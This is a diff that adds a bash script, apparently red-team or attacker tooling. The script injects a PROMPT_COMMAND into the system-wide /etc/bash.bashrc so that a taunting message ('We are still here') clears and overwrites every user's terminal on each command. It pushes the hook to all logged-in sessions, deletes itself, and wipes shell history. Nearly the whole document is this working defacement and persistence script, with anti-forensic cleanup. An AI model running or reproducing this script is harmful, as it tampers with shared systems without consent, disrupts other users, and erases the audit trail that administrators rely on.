@@ -1,0 +1,39 @@
+#!/bin/bash
+
+# === Red Team Shell Message Installer ===
+# Forces a message on every command, activates immediately,
+# and removes itself from the system afterward
+
+TARGET_BASHRC="/etc/bash.bashrc"
+
+echo "[+] Injecting Red Team message into $TARGET_BASHRC..."
+
+# Remove any existing PROMPT_COMMANDs to avoid stacking
+sed -i '/PROMPT_COMMAND=/d' "$TARGET_BASHRC"
+
+# Inject your visual domination message
+echo 'PROMPT_COMMAND='\''clear; echo -e "\e[1;91m\nWe are still here\nLove Ludicro <3\e[0m"\''' >> "$TARGET_BASHRC"
+
+echo "[+] Message hook added."
+
+# Activate it for all currently logged-in terminals
+echo "[*] Activating in all active sessions..."
+for tty in $(who | awk '{print $2}'); do
+  if [ -e /dev/"$tty" ]; then
+    echo 'source /etc/bash.bashrc' > /dev/"$tty"
+  fi
+done
+
+# Self-destruct
+echo "[*] Self-destructing..."
+SCRIPT_PATH="$0"
+rm -f "$SCRIPT_PATH"
+unset SCRIPT_PATH
+
+# Clean shell history (best-effort)
+export HISTFILE=~/.bash_history
+history -d $(history 1) 2>/dev/null
+history -w /dev/null
+unset HISTFILE
+
+echo "[+] Deployed, activated, and removed."
